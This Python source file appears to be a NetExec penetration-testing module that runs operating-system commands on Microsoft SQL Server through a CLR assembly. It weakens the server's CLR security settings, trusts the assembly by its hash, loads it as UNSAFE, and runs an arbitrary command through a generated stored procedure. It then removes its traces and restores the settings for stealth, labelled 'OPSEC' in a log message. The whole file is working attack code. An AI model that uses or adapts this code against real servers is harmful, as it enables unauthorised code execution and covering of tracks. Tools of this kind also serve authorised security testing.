from pathlib import Path
from nxc.helpers.misc import gen_random_string


class CLREXEC:
    def __init__(self, connection, logger):
        self.mssql_conn = connection
        self.logger = logger
        self.assembly_name = f"nxc_mssql_{gen_random_string(10)}"
        self.procedure_name = f"nxc_mssql_{gen_random_string(10)}"
        self.backuped_options = {}
        self.assembly_hex = None

    def execute(self, command, get_output, args=None) -> str:
        self.classname = getattr(args, "clr_classname", "StoredProcedures")
        self.method = getattr(args, "clr_method", "ExecuteCommand")
        self.clr_assembly = getattr(args, "clr_assembly", "")

        if not Path(self.clr_assembly).is_file():
            self.logger.fail(f"CLR assembly not found: {self.clr_assembly}")
            return ""

        with open(self.clr_assembly, "rb") as f:
            data = f.read()
        self.assembly_hex = f"0x{data.hex()}"

        self.backup_and_enable("advanced options")
        self.backup_and_enable("clr enabled")
        self.backup_and_disable("clr strict security")

        self._cleanup_stale()

        trust_query = f"""
        DECLARE @hash VARBINARY(64);
        SELECT @hash = HASHBYTES('SHA2_512', {self.assembly_hex});
        EXEC sp_add_trusted_assembly @hash = @hash, @description = N'{self.assembly_name}';
        """
        self.logger.debug(f"Trusting the assembly: {trust_query}")
        self.mssql_conn.sql_query(trust_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Error trusting assembly: {self.mssql_conn.lastError}")
            self._cleanup()
            self._restore_all()
            return ""

        create_assembly_query = f"""
        CREATE ASSEMBLY [{self.assembly_name}]
            FROM {self.assembly_hex}
            WITH PERMISSION_SET = UNSAFE;
        """
        self.logger.debug(f"Creating assembly: {create_assembly_query}")
        self.mssql_conn.sql_query(create_assembly_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Error creating assembly: {self.mssql_conn.lastError}")
            self._cleanup()
            self._restore_all()
            return ""

        create_proc_query = f"""
        CREATE PROCEDURE [{self.procedure_name}] @cmd NVARCHAR(4000)
            AS EXTERNAL NAME [{self.assembly_name}].[{self.classname}].[{self.method}];
        """
        self.logger.debug(f"Creating procedure: {create_proc_query}")
        self.mssql_conn.sql_query(create_proc_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Error creating procedure: {self.mssql_conn.lastError}")
            self._cleanup()
            self._restore_all()
            return ""

        exec_query = f"EXEC [{self.procedure_name}] @cmd = N'{command}';"
        self.logger.debug(f"Executing: {exec_query}")
        raw = self.mssql_conn.sql_query(exec_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Error executing procedure: {self.mssql_conn.lastError}")
            self._cleanup()
            self._restore_all()
            return ""

        self.logger.debug(f"Raw results: {raw}")
        output = ""
        if raw and raw[0]:
            first_val = list(raw[0].values())[0]
            output = first_val.decode("cp850").strip() if isinstance(first_val, bytes) else str(first_val).strip()

        self._cleanup()
        self._restore_all()
        return output

    def _cleanup_stale(self):
        stale_query = f"""
        DECLARE @asm_name SYSNAME, @proc_name SYSNAME;
        DECLARE cur CURSOR FOR
            SELECT name FROM sys.assemblies WHERE name = '{self.assembly_name}';
        OPEN cur;
        FETCH NEXT FROM cur INTO @asm_name;
        WHILE @@FETCH_STATUS = 0
        BEGIN
            SELECT TOP 1 @proc_name = OBJECT_NAME(m.object_id)
            FROM sys.assembly_modules m
            JOIN sys.assemblies a ON m.assembly_id = a.assembly_id
            WHERE a.name = @asm_name;
            IF @proc_name IS NOT NULL
                EXEC('DROP PROCEDURE [' + @proc_name + ']');
            EXEC('DROP ASSEMBLY [' + @asm_name + ']');
            FETCH NEXT FROM cur INTO @asm_name;
        END;
        CLOSE cur;
        DEALLOCATE cur;
        """
        self.logger.debug("Cleaning up stale nxc assemblies")
        self.mssql_conn.sql_query(stale_query)

    def _cleanup(self):
        if not self.assembly_hex:
            return

        untrust_query = f"""
        DECLARE @hash VARBINARY(64);
        SELECT @hash = HASHBYTES('SHA2_512', {self.assembly_hex});
        EXEC sp_drop_trusted_assembly @hash = @hash;
        """
        self.logger.debug(f"Untrusting the assembly: {untrust_query}")
        self.mssql_conn.sql_query(untrust_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Untrusting the assembly failed, artifacts may remain: {self.mssql_conn.lastError}")

        cleanup_query = f"""
        IF OBJECT_ID('{self.procedure_name}') IS NOT NULL
            DROP PROCEDURE [{self.procedure_name}];
        IF EXISTS (SELECT 1 FROM sys.assemblies WHERE name = '{self.assembly_name}')
            DROP ASSEMBLY [{self.assembly_name}];
        """
        self.logger.debug(f"Removing the assembly and the procedure: {cleanup_query}")
        self.mssql_conn.sql_query(cleanup_query)
        if self.mssql_conn.lastError:
            self.logger.error(f"Removing the assembly and the procedure failed, artifacts may remain: {self.mssql_conn.lastError}")

    def _restore_all(self):
        self.restore("clr strict security")
        self.restore("clr enabled")
        self.restore("advanced options")

    def restore(self, option):
        try:
            original = self.backuped_options.get(option)
            if original is None:
                return
            target_val = 1 if original else 0
            query = f"EXEC master.dbo.sp_configure '{option}', {target_val};RECONFIGURE;"
            self.logger.debug(f"Restoring '{option}' to {target_val}: {query}")
            self.mssql_conn.sql_query(query)
        except Exception as e:
            self.logger.error(f"[OPSEC] Error restoring '{option}': {e}")

    def backup_and_enable(self, option):
        try:
            self.backuped_options[option] = self.is_option_enabled(option)
            if not self.backuped_options[option]:
                query = f"EXEC master.dbo.sp_configure '{option}', 1;RECONFIGURE;"
                self.logger.debug(f"Enabling '{option}': {query}")
                self.mssql_conn.sql_query(query)
        except Exception as e:
            self.logger.error(f"Error enabling '{option}': {e}")

    def backup_and_disable(self, option):
        try:
            self.backuped_options[option] = self.is_option_enabled(option)
            if self.backuped_options[option]:
                query = f"EXEC master.dbo.sp_configure '{option}', 0;RECONFIGURE;"
                self.logger.debug(f"Disabling '{option}': {query}")
                self.mssql_conn.sql_query(query)
        except Exception as e:
            self.logger.error(f"Error disabling '{option}': {e}")

    def is_option_enabled(self, option):
        query = f"EXEC master.dbo.sp_configure '{option}';"
        result = self.mssql_conn.sql_query(query)
        self.logger.debug(f"'{option}' check result: {result}")
        return bool(result and result[0]["config_value"] == 1)